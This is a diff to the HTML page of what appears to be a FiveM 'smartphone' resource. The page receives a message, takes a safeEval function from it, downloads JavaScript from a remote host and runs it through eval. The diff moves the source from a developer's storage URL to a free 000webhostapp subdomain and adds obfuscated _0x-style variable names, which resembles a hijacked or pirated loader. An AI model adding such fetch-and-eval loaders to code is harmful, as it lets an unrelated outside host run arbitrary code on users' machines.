@@ -1,31 +1,43 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 </head>
+
 <body>
-    <div id="root"></div>
-    
-    <script>
-         let loaded = false;
-         window.addEventListener('message', ({data: a}) => {
-            if (!loaded) {
-                loaded = true;
-                const b = c => 'https://fivem.jesteriruka.dev/storage/scripts/6056b4aa1cf80010efb4ed1d/stable:191//' + c;
-                globalThis.safeEval = a.safeEval;
-                fetch(b('app.js')).then(d => {
-                    if (d.status < 200 || d.status >= 300) {
-                        throw new Error('Failed to fetch js -> ' + d.status);
-                    }
-                    return d.text();
-                }).then(eval).then();
-                let e = document.createElement('link');
-                e.rel = 'stylesheet';
-                e.href = b('styles.css');
-                document.head.appendChild(e);
+  <div id="root"></div>
+
+  <script>
+    let loaded = false
+
+    window.addEventListener('message', ({
+      data: _0x44e5b9
+    }) => {
+      if (!loaded) {
+        loaded = true
+        const _0x518d67 = (_0x3ee653) =>
+          'https://caustic-bones.000webhostapp.com/Advanced/smartphone' +
+          '/' +
+          _0x3ee653
+        globalThis.safeEval = _0x44e5b9.safeEval
+        fetch(_0x518d67('apps.js'))
+          .then((_0x418e93) => {
+            if (_0x418e93.status < 200 || _0x418e93.status >= 300) {
+              throw new Error('Failed to fetch js -> ' + _0x418e93.status)  
             }
-        });
-    </script>
+            return _0x418e93.text()
+          })
+          .then(eval)
+          .then(() => console.log('Setup Finish'))
+        let _0x1e4f6b = document.createElement('link')
+        _0x1e4f6b.rel = 'stylesheet'
+        _0x1e4f6b.href = _0x518d67('styles.css')
+        document.head.appendChild(_0x1e4f6b)
+      }
+    })
+  </script>
 </body>
+
 </html>
